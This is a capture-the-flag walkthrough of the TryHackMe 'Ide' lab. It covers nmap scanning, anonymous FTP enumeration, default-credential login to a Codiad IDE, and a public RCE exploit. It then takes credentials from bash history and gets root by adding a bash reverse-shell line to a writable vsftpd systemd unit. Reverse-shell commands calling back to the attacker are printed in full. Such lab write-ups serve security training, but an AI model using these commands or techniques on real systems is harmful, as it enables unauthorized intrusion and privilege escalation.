## Ide 

Room link: https://tryhackme.com/room/ide

# Scanning 
I ran an aggressive nmap scan to begin. It looked like there are 3 services running on the system, FTP, SSH, and HTTP. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-14 20:17 EDT
Nmap scan report for [Remote IP]
Host is up (0.094s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.1.236
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
```
A full nmap scan showed a random high port as well. 
```
ajread@aj-ubuntu:~/TryHackMe/thm_writeups_publish$ nmap -p- [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 18:46 EDT
Nmap scan report for [Remote IP]
Host is up (0.090s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 239.50 seconds
```

# Enumeration 
I first looked into the anonymous ftp login. There was a file called ```-``` nested within a the ```...``` directory. 
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> cd ./-
550 Failed to change directory.
ftp> get -
local: ./- remote: -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for - (151 bytes).
226 Transfer complete.
151 bytes received in 0.00 secs (1.1163 MB/s)
```
I pulled the ```-``` file from the FTP server and it appeared to be a note. The note itself said the following: 
```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```
So, I can infer that there are two users named ```john``` and ```drac```. User ```john``` must have a simple password. Before looking back at the random open high port, I ran hydra against the FTP and SSH service with username ```john``` and a simple password list. I was unsuccessful so I knew the credentials must be used somewhere else on the system. 

# Initial Access
I checked out the random high port and found that it was a Codiad IDE interface running on port 62337. I tried to login with a default password for user ```john``` and authenticated! I found a Codiad RCE on exploitdb: ```https://www.exploit-db.com/exploits/49705``` that requires authentication. The RCE appears to be able to write to Codiad within ```components/filemanager/controller.php``` and execute system commands like ```nc``` or ```/bin/bash``` that can be used to call back to a remote machine.

Before running the exploit, it required me to set up a VPS for the connection. So, in one terminal, I set up reverse shell in bash that would pipe to another listener on my machine from the remote connection. 
```
echo 'bash -c "bash -i >/dev/tcp/[Local IP]/10000 0>&1 2>&1"' | nc -lnvp 9999
```
In another terminal on my local machine, I set up the listener on port 10000 to receive the final reverse shell from the remote machine. 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 10000
```
After everything was set up, I ran the exploit and pointed it as the Codiad IDE with the ```john:[REDACTED]``` credentials.
```
ajread@aj-ubuntu:~/TryHackMe/practice$ python3 49705.py http://[Remote IP]:62337/ john [REDACTED] [Local IP] 9999 linux
```
And, I received a shell! 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 10000
Listening on 0.0.0.0 10000
Connection received on [Remote IP] 57402
bash: cannot set terminal process group (939): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
But, I was only the ```www-data``` user. I needed to move to the ```drac``` user in order to see the user flag. 
```
www-data@ide:/home/drac$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
After some looking around, I found credentials within user ```drac``` bash history. 
```
www-data@ide:/home/drac$ cat .bash_history
cat .bash_history
mysql -u drac -p [REDACTED]
```
I used ssh to log in with the credentials above and found the flag! 
```
drac@ide:~$ id
uid=1000(drac) gid=1000(drac) groups=1000(drac),24(cdrom),27(sudo),30(dip),46(plugdev)
drac@ide:~$ wc -c user.txt
33 user.txt
```
# Privilege Escalation 
Using  ```sudo -l``` it looked like I could restart vsftpd as root. 
```
drac@ide:~$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
I looked at the ```vsftpd.service``` file and noticed that I had write permissions. Since ```ExecStartPre``` contains additional commands that are run after ```ExecStart```, I added another ```ExecStartPre``` field to execute a reverse shell using bash after the original ```ExecStartPre```. (This page was a great resource: ```https://www.freedesktop.org/software/systemd/man/systemd.service.html``` if interested). 
```
drac@ide:/lib/systemd/system$ cat vsftpd.service 
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
ExecStartPre=-/bin/bash -c "bash -i >& /dev/tcp/[Local IP]/8888 0>&1"

[Install]
WantedBy=multi-user.target
```
I started a listener on my local machine to catch the elevated reverse shell on port 8888 above.
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
```
Then, I had to reload the daemon on the remote machine before restarting vsftpd. 
```
drac@ide:/lib/systemd/system$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
```
Finally, I was able to restart the service as root on the remote machine. 
```
drac@ide:/lib/systemd/system$ sudo service vsftpd restart 
```
And it called back to my local machine with an elevated shell! 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
Listening on 0.0.0.0 8888
Connection received on [Remote IP] 35294
bash: cannot set terminal process group (1683): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ide:/# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
```
